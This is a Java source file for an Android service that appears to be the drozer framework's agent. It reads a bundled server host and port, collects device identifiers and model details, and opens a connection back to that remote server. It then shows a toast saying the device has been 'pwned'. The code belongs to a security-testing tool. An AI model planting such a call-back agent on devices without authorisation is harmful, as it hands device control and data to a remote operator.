package com.mwr.dz;

import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.security.SecureRandom;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

import com.mwr.jdiesel.api.DeviceInfo;
import com.mwr.jdiesel.api.connectors.Endpoint;
import com.mwr.jdiesel.api.links.Client;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.provider.Settings;
import android.widget.Toast;

public class Agent extends Service {
	
	private static Agent INSTANCE;
	
	private Client client;
	private DeviceInfo device_info;
	private Endpoint endpoint;
	private String uid;

	public static Context getContext() {
		return Agent.INSTANCE.getMercuryContext();
	}
	
	public Context getMercuryContext() {
		return this.getApplicationContext();
	}

	public String getUID() {
		if(this.uid == null)
			this.uid = Settings.Secure.getString(this.getMercuryContext().getContentResolver(), Settings.Secure.ANDROID_ID);

		// sometimes, a device will not have an ANDROID_ID, particularly if we
		// are in lower API versions; in that case we generate one at random
		if(this.uid == null)
			this.uid = new BigInteger(64, new SecureRandom()).toString(32);

		return this.uid;
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
		
		Agent.INSTANCE = this;
		
		Configuration configuration = new Configuration(this.getApplicationContext(), R.raw.endpoint);
		this.device_info = new DeviceInfo(this.getUID(),
				android.os.Build.MANUFACTURER,
				android.os.Build.MODEL,
				android.os.Build.VERSION.RELEASE);
		this.endpoint = new Endpoint(
				1,
				"drozer Server",
				configuration.get("host"),
				Integer.parseInt(configuration.get("port")),
				configuration.get("ssl").startsWith("t"),
				configuration.get("ts_path"),
				configuration.get("ts_password"),
				configuration.get("password"));
		this.client = new Client(this.endpoint, this.device_info);
		this.client.start();
		
		Toast.makeText(this, String.format(Locale.ENGLISH, "Thanks. We've pwned your device.", endpoint.toConnectionString()), Toast.LENGTH_SHORT).show();
	}
	
	@Override
	public void onDestroy() {
		this.client.stopConnector();
	}
	
	private static class Configuration {
		
		Map<String,String> config = new HashMap<String,String>();
		
		public Configuration(Context ctx, int res) {
			try {
				InputStream is = ctx.getResources().openRawResource(R.raw.endpoint);
				byte[] tmp = new byte[64];
				StringBuffer data = new StringBuffer();
				int c;
				while((c = is.read(tmp)) > 0) {
					byte[] buf = new byte[c];
					System.arraycopy(tmp, 0, buf, 0, c);
					
					data.append(new String(buf));
				}

				for(String line : data.toString().split("\n")) {
					if(line.indexOf(":") > 0) {
						String[] kv = line.split(":");
						
						if(kv.length == 2)
							this.config.put(kv[0], kv[1]);
						else
							this.config.put(kv[0], "");
					}
				}
			}
			catch(IOException e) {}
		}
		
		public String get(String key) {
			return this.config.get(key);
		}
		
	}

}
